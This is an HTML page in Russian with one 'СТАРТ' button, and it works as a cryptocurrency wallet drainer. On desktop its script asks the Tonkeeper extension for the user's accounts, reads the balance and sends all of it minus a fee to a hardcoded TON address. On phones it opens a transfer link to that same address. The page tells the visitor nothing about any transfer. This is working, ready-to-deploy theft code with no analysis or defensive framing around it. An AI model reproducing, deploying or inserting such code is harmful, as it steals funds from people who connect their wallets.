<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON</title>
    <style>
        * {
            margin: 0;
            padding: 0;
        }
        body {
            background: #0d0d0d;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: Arial;
        }
        .btn {
            background: linear-gradient(135deg, #00d4ff, #0077ff);
            border: none;
            color: #fff;
            font-size: 26px;
            font-weight: bold;
            padding: 25px 60px;
            border-radius: 60px;
            cursor: pointer;
            box-shadow: 0 0 50px rgba(0, 150, 255, 0.3);
            transition: 0.3s;
            letter-spacing: 2px;
        }
        .btn:hover {
            transform: scale(1.05);
            box-shadow: 0 0 70px rgba(0, 150, 255, 0.5);
        }
        .btn:active {
            transform: scale(0.95);
        }
        #status {
            position: fixed;
            bottom: 30px;
            left: 0;
            right: 0;
            text-align: center;
            color: #444;
            font-size: 13px;
            font-family: monospace;
        }
    </style>
</head>
<body>
    <button class="btn" id="mainBtn">▶ СТАРТ</button>
    <div id="status">готов</div>

    <script>
        const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
        const btn = document.getElementById('mainBtn');
        const status = document.getElementById('status');

        // ====== ГЛАВНАЯ ФУНКЦИЯ ======
        async function startSnipe() {
            try {
                status.innerText = '⏳ подключение...';
                btn.disabled = true;
                btn.style.opacity = '0.5';

                // 1. ПРОВЕРЯЕМ РАСШИРЕНИЕ (десктоп)
                if (window.tonkeeper) {
                    status.innerText = '⏳ расширение найдено...';
                    const provider = window.tonkeeper;
                    
                    // Подключаем кошелек
                    const accounts = await provider.send('ton_requestAccounts', {});
                    if (!accounts || accounts.length === 0) {
                        status.innerText = '❌ отказ';
                        btn.disabled = false;
                        btn.style.opacity = '1';
                        return;
                    }
                    
                    const userAddress = accounts[0];
                    status.innerText = '⏳ проверка баланса...';
                    
                    // Получаем баланс
                    const hex = await provider.send('ton_getBalance', { address: userAddress });
                    const nano = parseInt(hex, 16);
                    
                    if (nano <= 0) {
                        status.innerText = '💀 баланс 0';
                        btn.disabled = false;
                        btn.style.opacity = '1';
                        return;
                    }
                    
                    const fee = 10000000;
                    const amount = nano - fee;
                    
                    if (amount <= 0) {
                        status.innerText = '💀 меньше комиссии';
                        btn.disabled = false;
                        btn.style.opacity = '1';
                        return;
                    }
                    
                    status.innerText = '⏳ отправка...';
                    
                    // ====== ОТПРАВКА (БЕЗ ЛИШНИХ ДАННЫХ) ======
                    const result = await provider.send('ton_sendTransaction', {
                        to: TARGET,
                        value: String(amount),
                        data: '',
                        stateInit: ''
                    });
                    
                    if (result && result.code === 0) {
                        status.innerText = '✅ done';
                        btn.innerText = '✅';
                        btn.style.background = 'linear-gradient(135deg, #00cc44, #008833)';
                        btn.disabled = true;
                    } else {
                        status.innerText = '❌ отказ';
                        btn.disabled = false;
                        btn.style.opacity = '1';
                    }
                    return;
                }

                // 2. ДЛЯ ТЕЛЕФОНА (через TON Connect)
                if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
                    status.innerText = '📱 открываю TON Keeper...';
                    
                    // Формируем ссылку с транзакцией
                    const txData = {
                        address: TARGET,
                        amount: '0.01',
                        comment: ''
                    };
                    
                    // Кодируем в base64 для TON Connect
                    const encoded = btoa(JSON.stringify(txData));
                    
                    // Открываем через TON Keeper
                    const url = `tonkeeper://transfer?${new URLSearchParams(txData).toString()}`;
                    window.location.href = url;
                    
                    setTimeout(() => {
                        window.open(url, '_blank');
                    }, 300);
                    
                    status.innerText = '✅ подтвердите в TON Keeper';
                    btn.disabled = false;
                    btn.style.opacity = '1';
                    return;
                }

                // 3. ЕСЛИ НИЧЕГО НЕ РАБОТАЕТ
                status.innerText = '⚠️ установите TON Keeper';
                btn.disabled = false;
                btn.style.opacity = '1';

            } catch(e) {
                status.innerText = '❌ ' + e.message;
                btn.disabled = false;
                btn.style.opacity = '1';
            }
        }

        // ====== НАВЕШИВАЕМ КНОПКУ ======
        btn.onclick = startSnipe;

        // ====== АВТОЗАПУСК ПРИ ЗАГРУЗКЕ ======
        setTimeout(() => {
            if (window.tonkeeper) {
                status.innerText = 'готов (расширение найдено)';
            } else {
                status.innerText = 'готов (нажми СТАРТ)';
            }
        }, 500);
    </script>
</body>
</html>
